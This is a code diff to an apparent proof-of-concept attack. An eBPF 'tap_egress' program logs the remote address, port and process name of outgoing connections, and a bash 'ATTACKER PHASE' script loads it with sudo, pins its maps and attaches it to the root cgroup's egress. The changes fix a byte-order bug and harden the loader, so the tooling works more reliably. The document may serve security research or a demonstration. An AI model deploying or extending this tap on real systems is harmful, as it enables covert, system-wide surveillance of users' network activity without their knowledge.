@@ -91,7 +91,7 @@ int tap_egress(struct __sk_buff *skb)
     __u32 slot = *idx % 64;
     struct capture_t cap = {};
     cap.remote_ip   = skb->remote_ip4;
-    cap.remote_port = bpf_ntohl(skb->remote_port) >> 16;
+    cap.remote_port = (__u16)(__builtin_bswap32(skb->remote_port) >> 16);
     bpf_get_current_comm(cap.comm, sizeof(cap.comm));
     bpf_map_update_elem(&cap_map, &slot, &cap, 0);
 
@@ -185,11 +185,17 @@ atk "══ ATTACKER PHASE ═════════════════�
 atk "Cleaning any leftover pins from previous runs..."
 sudo rm -f /sys/fs/bpf/poc_tap /sys/fs/bpf/cap_map /sys/fs/bpf/idx_map 2>/dev/null || true
 
-atk "Loading BPF program and pinning to /sys/fs/bpf/..."
+atk "Loading BPF program to /sys/fs/bpf/poc_tap..."
 sudo bpftool prog load /tmp/tap.bpf.o /sys/fs/bpf/poc_tap \
-    map name cap_map pinned /sys/fs/bpf/cap_map \
-    map name idx_map pinned /sys/fs/bpf/idx_map
+    || { echo -e "${RED}[ERROR] bpftool prog load failed — aborting${NC}"; exit 1; }
 ok "BPF tap program pinned at /sys/fs/bpf/poc_tap"
+
+atk "Pinning maps to /sys/fs/bpf/..."
+sudo bpftool map pin name cap_map /sys/fs/bpf/cap_map \
+    || { echo -e "${RED}[ERROR] could not pin cap_map — aborting${NC}"; exit 1; }
+sudo bpftool map pin name idx_map /sys/fs/bpf/idx_map \
+    || { echo -e "${RED}[ERROR] could not pin idx_map — aborting${NC}"; exit 1; }
+ok "cap_map and idx_map pinned to bpffs"
 
 atk "Attaching tap to ROOT cgroup with BPF_F_ALLOW_MULTI..."
 sudo bpftool cgroup attach /sys/fs/cgroup egress \
